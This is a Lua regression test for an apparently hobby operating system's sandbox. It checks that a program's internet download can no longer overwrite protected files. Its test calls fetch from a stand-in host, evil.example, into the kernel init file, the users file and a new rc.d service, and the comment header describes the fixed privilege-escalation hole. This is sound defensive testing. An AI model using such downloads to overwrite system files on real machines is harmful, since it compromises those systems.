-- ╔══════════════════════════════════════════════════════════════╗
-- ║  Regression Test: a sandbox's download lands through securefs   ║
-- ║                                                                ║
-- ║  The `internet` capability's download(url, dest) passed dest    ║
-- ║  straight to kernel.internet.download, which writes with the    ║
-- ║  RAW kernel fs and leaves vetting the path to its caller. The   ║
-- ║  sandbox wrapper WAS the caller and vetted nothing, so any      ║
-- ║  package declaring `internet` could replace /tos/kernel/        ║
-- ║  init.lua, /etc/users.dat or an /etc/rc.d script with bytes it  ║
-- ║  served -- past every ACL and the protected-path guard, with    ║
-- ║  no fs capability at all.                                       ║
-- ║                                                                ║
-- ║  Now download needs fs.write, and every write -- the .part, the ║
-- ║  rename, the fallback -- goes through the program's own         ║
-- ║  session-bound securefs. A caller cannot hand in an fs of its   ║
-- ║  own.                                                            ║
-- ║                                                                ║
-- ║  The REAL sandbox, kernel.internet, securefs and users, over a  ║
-- ║  fake internet card and one recording filesystem, so a byte     ║
-- ║  that reaches the disk by ANY route is seen.                    ║
-- ╚══════════════════════════════════════════════════════════════╝
-- Run: lua usr/lib/tests/test_sandbox_internet_download.lua   (from TOS-Dev)

local passed, failed = 0, 0
local function test(name, cond)
  if cond then passed = passed + 1; print("  PASS: " .. name)
  else failed = failed + 1; print("  FAIL: " .. name) end
end

local here = (arg and arg[0]) or "usr/lib/tests/test_sandbox_internet_download.lua"
local base = here:gsub("[^/\\]*$", "")
package.path = "tos/?.lua;" .. base .. "../../../tos/?.lua;" .. package.path

-- A fake internet card: HTTP on, every request answers 200 with PAYLOAD.
local PAYLOAD = "-- attacker-served bytes\n"
local CARD = "inet-card-0001"
package.loaded["computer"] = { uptime = function() return 0 end, freeMemory = function() return 1e6 end,
  pushSignal = function() end, pullSignal = function() end, address = function() return "m" end }
package.loaded["component"] = {
  list = function(t)
    local done = false
    return function()
      if t == "internet" and not done then done = true; return CARD, "internet" end
    end
  end,
  proxy = function(addr)
    if addr ~= CARD then return nil end
    return {
      isHttpEnabled = function() return true end,
      isTcpEnabled  = function() return false end,
      request = function()
        local sent = false
        return {
          read = function() if sent then return nil end; sent = true; return PAYLOAD end,
          response = function() return 200, "OK", {} end,
          close = function() end,
        }
      end,
    }
  end,
  type = function(addr) return addr == CARD and "internet" or nil end,
}
package.loaded["kernel.process"] = { currentSession = function() return nil end,
                                     yieldCooperative = function() end }

-- ONE recording filesystem under everything: the raw kernel fs the old
-- wrapper wrote through, and the fs securefs sits on.
local kfs = require("kernel.fs")
local disk = { ["/tos/kernel/init.lua"] = "-- the real kernel\n", ["/etc/users.dat"] = "return {}" }
local rawFs = setmetatable({
  exists     = function(p) return disk[p] ~= nil end,
  isDirectory = function() return false end,
  readFile   = function(p) return disk[p] end,
  writeFile  = function(p, d) disk[p] = d; return true end,
  appendFile = function(p, d) disk[p] = (disk[p] or "") .. d; return true end,
  remove     = function(p) local had = disk[p] ~= nil; disk[p] = nil; return had end,
  rename     = function(a, b) if disk[a] == nil then return false end
                 disk[b] = disk[a]; disk[a] = nil; return true end,
  makeDirectory = function() return true end,
}, { __index = kfs })

local users = require("kernel.users")
users.init({ fs = { normalize = kfs.normalize, exists = function() return false end,
  readFile = function() return nil end, writeFile = function() return true end,
  makeDirectory = function() return true end },
  crypto = { init = function() end, hasHardware = function() return false end,
    salt = function(n) return string.rep("s", n or 16) end,
    hashPassword = function(pw, s) return "h:" .. pw .. s end } })
local securefs = require("kernel.securefs")
securefs.init({ fs = rawFs, users = users, log = nil })
_G._TOS = { fs = rawFs, securefs = securefs, users = users }

local sandbox = require("kernel.sandbox")
local T = users.TIER
local alice = { user = "alice", tier = T.USER, home = "/home/alice" }

print("=== a sandbox's download lands through securefs ===")
print()

-- ── internet alone: network, not disk ──────────────────────────────
local netOnly = sandbox.build({ caps = { internet = true }, session = alice })
test("the internet cap exposes download", type(netOnly.internet) == "table"
  and type(netOnly.internet.download) == "function")
local ok1, e1 = netOnly.internet.download("http://evil.example/x", "/tos/kernel/init.lua")
test("with no fs.write, download refuses", not ok1)
test("...and says which capability it needs",
  type(e1) == "string" and e1:find("fs.write", 1, true) ~= nil)
test("...and the kernel is untouched", disk["/tos/kernel/init.lua"] == "-- the real kernel\n")

-- ── internet + fs.write: only where alice may write ───────────────
local both = sandbox.build({ caps = { internet = true, ["fs.read"] = true, ["fs.write"] = true },
                             session = alice })
local ok2 = both.internet.download("http://evil.example/x", "/tos/kernel/init.lua")
test("a USER's program cannot download over the kernel", not ok2
  and disk["/tos/kernel/init.lua"] == "-- the real kernel\n")
local ok3 = both.internet.download("http://evil.example/x", "/etc/users.dat")
test("...nor over the shadow file", not ok3 and disk["/etc/users.dat"] == "return {}")
local ok4 = both.internet.download("http://evil.example/x", "/etc/rc.d/evil.lua")
test("...nor plant an rc.d service", not ok4 and disk["/etc/rc.d/evil.lua"] == nil)
test("...and no .part is left anywhere protected",
  disk["/tos/kernel/init.lua.part"] == nil and disk["/etc/rc.d/evil.lua.part"] == nil)

-- A filesystem of the program's own choosing is not honoured.
local ok5 = both.internet.download("http://evil.example/x", "/tos/kernel/init.lua",
  { fs = rawFs, maxBytes = 1024 })
test("opts.fs from the program is ignored", not ok5
  and disk["/tos/kernel/init.lua"] == "-- the real kernel\n")

-- ...while an honest download into alice's own home still works.
local ok6, e6 = both.internet.download("http://example.org/notes.txt", "/home/alice/notes.txt")
test("a download into the program's own home works" .. (ok6 and "" or (" (" .. tostring(e6) .. ")")),
  ok6 == true and disk["/home/alice/notes.txt"] == PAYLOAD)
test("...with no .part left behind", disk["/home/alice/notes.txt.part"] == nil)

-- Kernel callers (pkgremote's staging) keep the raw fs they vet for.
local inet = require("kernel.internet")
local ok7 = inet.download("http://example.org/pkg.lua", "/var/pkg/remote/r/pkg.lua")
test("a kernel caller still downloads through the raw fs",
  ok7 == true and disk["/var/pkg/remote/r/pkg.lua"] == PAYLOAD)

print()
print(string.format("Results: %d passed, %d failed", passed, failed))
if failed > 0 then print("*** TESTS FAILED ***"); return false
else print("All tests passed."); return true end
